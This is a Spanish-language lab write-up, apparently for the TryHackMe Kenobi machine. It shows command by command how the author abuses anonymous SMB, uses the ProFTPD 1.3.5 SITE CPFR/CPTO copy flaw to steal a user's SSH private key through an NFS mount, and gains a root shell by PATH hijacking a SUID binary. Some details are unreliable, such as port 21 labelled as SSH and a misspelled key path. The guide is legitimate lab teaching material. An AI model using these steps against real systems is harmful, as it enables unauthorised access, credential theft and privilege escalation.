-----------
- Tags:  #writeup #info #thm #tutorial #smb
-----------

Se encuentra corriendo [[Samba]] en el puerto *445* ([[SMB - 445]]), con ayuda del comando *smbmap* podriamos ver posibles recursos compartidos
 
```bash
smbmap -H ip
```

Nos encuentra el usuario *anonymus* (Recurso Compartido), por lo cual usando *smbclient* intentaremos entablar una conexion, usando el parametro *-N* para autenticarnos con sesion  nula
```bash
smbclient //ip/anonymus -N 
```

Dentro del [[smb]] podemos descargarnos el archivo log.txt usando *get*:
```bash
get log.txt
```

Este archivo nos muestra un contenido en el cual se indica los siguiente:
```bash
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

```
Es decir, que se tiene un usuario *Kenobi* el cual contienen una clave [[SSH]], es decir el *id_rsa*

-------------

- Ahora con esta informacion volvemos a ver el scaneo de [[Nmap]], el cual nos mostraba que tambien esta habiltado el puerto *21* ([[SSH]]) con una version vulnerable de [[ProFTPD]]

Con ayuda de *searchsploit* buscamos por la version y servicio (*ProFTPD 1.3.5*), esto nos muestra un exploit  *File Copy* con el cual intentaremos copiar archivos de la maquina a nuestro equipo local. 

- Por otro lado la maquina tambien tiene abierto el puerto [[RPC - 111]], el cual muestra que existen *monturas* - [[Mount]] 
Para poder comprobar si existen dichas monturas podemos ejecutar el sig comando:
```bash
showmount -e ipVict
```
Se muestra que existe una montura en el directorio */var* , lo cual significa que este directorio podriamos nosotros montarlo de manera local en nuestro equipo 


------------------

- Ahora para entrar a la maquina usaremos [[NetCat]] para conectarnos por [[FTPD - 21]]
```bash
nc ipVict 21
```

- Ahora dentro de la maquina con ayuda del exploit menicionado de *ProFTPD 1.3.5* haremos uso de los comandos *SITE CPFR y SITE CPTO* para obtener la clave de *id_rsa*:
```bash
SITE CPFR /home/kenobi/.shh/id_rsa

SITE CPTO /var/tmp/id_rsa
```

- Ya con esto podemos salir de la maquina para proceder a montarlo en nuestro equipo local de la siguiente forma:
```bash
cd /mnt
mkdir miMontura
mount ipVict:/var/tmp miMontura
```


Lo que conseguimos en este punto es tener en nuestra maquina la clave *id_rsa* del usuario *Kenobi* aprovechando la falla del *ProFTPD 1.3.5*. Ahora en este archivo podemos moverlo a el escritorio y darle permisos de ejecucion para poder utilizarlo:
```bash
mv id_rsa /home/luisillo/desktop
cd /home/luisillo/desktop
chmod 600 id_rsa
```

- Ahora con esto podemos entablara una conexion [[SSH]] sin proporcionar ningun tipo de contraseña ya que disponemos del *id_rsa* del usurario *Kenobi* 
```bash
ssh -i id_rsa kenobi@ipVict 
```
Dentro obtenmos el archivo *user.txt* con la primera flag

----------

# Privesc

- Como siempre empezaremos buscando binarios con permisos *SUID* [[Abuso de privilegios SUID]]
```bash
find / -perm -4000 2>/dev/null
```

- Aqui dentro encontramos algo poco normal, el binario */menu*,  dicho binario nos permite entrar en una especie de menu con opciones el cual permite ejecutar diferentes opciones, (1, 2 , 3), dichas opciones ejecutan otros binarios(curl, lsb_release y ifconfig) con permisos privilegiados - *root*

## Aqui lo que se puede acontencer es un [[PATH Hijacking]]

Trataremos de crear un binario, por ejemplo *ifconfig* que nos de una consola como *root*, y modificando el *Path* haremos que este binario se ejecute en vez del original

```bash
echo /bin/bash > ifconfig
chmod 777 ifconfig
export PATH=.:$PATH
//Lo hacemos de esa forma para que el $PATH empiece en el directorio actual, es decir donde esta nuestro ifconfig 
```

- Ahora solo ejecutamos el binario */menu*, con la opcion *3* y esto nos da una bash con maximos privilegios
